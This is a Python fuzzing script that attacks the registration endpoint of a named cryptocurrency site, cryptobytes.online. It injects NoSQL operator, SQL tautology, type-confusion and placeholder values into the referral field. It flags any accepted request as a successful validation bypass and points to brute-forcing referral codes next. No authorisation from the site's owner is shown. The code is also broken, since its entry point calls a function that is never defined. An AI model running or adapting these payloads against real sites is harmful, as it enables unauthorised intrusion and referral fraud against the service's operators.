#!/usr/bin/env python3
"""
REFERRAL FUZZER MODULE — Registration Logic & Validation Bypass
Target: cryptobytes.online/user/register
"""
import json
from modules.transport import SecureTransport

def audit_referral_endpoint(target_url="https://cryptobytes.online"):
    transport = SecureTransport(target_url)
    register_path = "/user/register" # Adjust if your actual API route differs
    
    # Offensive test vectors targeting referral validation logic
    fuzz_payloads = [
        {"name": "Null Referral Code", "ref": None},
        {"name": "Boolean True Injection", "ref": True},
        {"name": "Empty String", "ref": ""},
        {"name": "NoSQL Operator ($ne)", "ref": {"$ne": None}},
        {"name": "SQL Tautology", "ref": "' OR '1'='1"},
        {"name": "Integer Overflow / Type Confusion", "ref": 0},
        {"name": "Common Admin / Root Placeholder", "ref": "ADMIN"},
        {"name": "Array Wrapping", "ref": ["5702185"]}
    ]

    base_data = {
        "email": "audit.test@cryptobytes.online",
        "password": "SecurePassword123!",
        "referral": ""
    }

    print(f"\n[***] STARTING REFERRAL VALIDATION AUDIT AGAINST: {target_url}{register_path} [***]\n")

    for vector in fuzz_payloads:
        payload = base_data.copy()
        payload["referral"] = vector["ref"] # Change key to match your form field name (e.g., 'ref', 'referral_code', 'invite')

        status, headers, body = transport.request("POST", register_path, payload=payload)
        
        print(f"[-] Vector: {vector['name']} (Value: {vector['ref']})")
        print(f"    -> Status Code: {status}")
        print(f"    -> Response Preview: {body[:120].strip()}")

        if status in [200, 201] and "error" not in body.lower() and "user not found" not in body.lower():
            print(f"\n[!] SUCCESS! Referral validation bypassed or mutated successfully using: {vector['name']}\n")
            return vector

    print("\n[-] Standard referral validations held firm. Checking if referral codes can be brute-forced or enumerated...")
    return None

if __name__ == "__main__":
    audit_referral_index()
